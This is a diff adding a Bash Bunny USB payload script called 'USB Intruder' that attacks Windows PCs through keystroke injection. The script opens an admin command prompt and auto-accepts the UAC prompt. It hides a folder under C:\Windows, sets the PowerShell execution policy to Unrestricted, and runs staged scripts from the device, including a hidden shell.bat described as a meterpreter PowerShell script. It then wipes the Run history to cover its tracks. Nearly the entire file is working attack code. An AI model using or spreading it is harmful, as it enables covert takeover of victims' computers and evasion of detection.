@@ -1,0 +1,76 @@
+#!/bin/bash
+#
+#TITLE: USB Intruder
+#AUTHOR: B0rk
+#VERSION: 1.1
+#PROPS: Hak5Darren, Diggster, IMcPwn and many more
+#OS: Windows (Requires Powershell and Admin privs)
+#ATTACKMODES: HID STORAGE
+#
+#DESCRIPTION: Opens up attack vectors and a meterpreter powershell script on a Victim PC. **Based on usb_exfiltrator by DK & Friends**
+#
+#LED INDICATORS:
+#White - Initialization
+#Blue Blinking - HID/STORAGE Phase
+#Yellow Blinking - Cleanup
+#Green Blinking - Syncing BB for removal
+#Green - Attack Completion
+
+#Initialization - Setting AttackModes
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+#Initialization Completed
+
+#Beginning of HID/STORAGE Phase
+LED ATTACK
+#Description::
+Q DELAY 2000
+Q GUI d
+Q DELAY 100
+Q GUI r
+Q DELAY 500
+Q STRING powershell -Command "Start-Process cmd -Verb RunAs"
+Q ENTER
+Q DELAY 1000
+Q ALT y
+Q DELAY 800
+Q STRING mkdir C:\\Windows\\ProgData
+Q ENTER
+Q STRING attrib +h C:\\Windows\\ProgData
+Q ENTER
+Q STRING powershell
+Q ENTER
+Q DELAY 800
+Q STRING Set-ExecutionPolicy Unrestricted
+Q ENTER
+Q STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\d.cmd')"
+Q ENTER
+Q DELAY 2000
+Q STRING cd \$Env:WinDir\\ProgData
+Q ENTER
+Q STRING .\\seq1.ps1
+Q ENTER
+Q DELAY 1000
+Q STRING powershell -WindowStyle Hidden \$Env:WinDir\ProgData\shell.bat
+Q ENTER
+Q STRING exit
+Q ENTER
+Q STRING exit
+Q ENTER
+Q DELAY 500
+#End of HID/STORAGE Phase
+
+#Cleanup
+LED CLEANUP
+#Clears complete run history
+Q GUI r
+Q DELAY 500
+Q STRING powershell -WindowStyle Hidden Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+Q ENTER
+#End of Cleanup
+
+#Completion of script
+sync
+LED FINISH
+#Completed
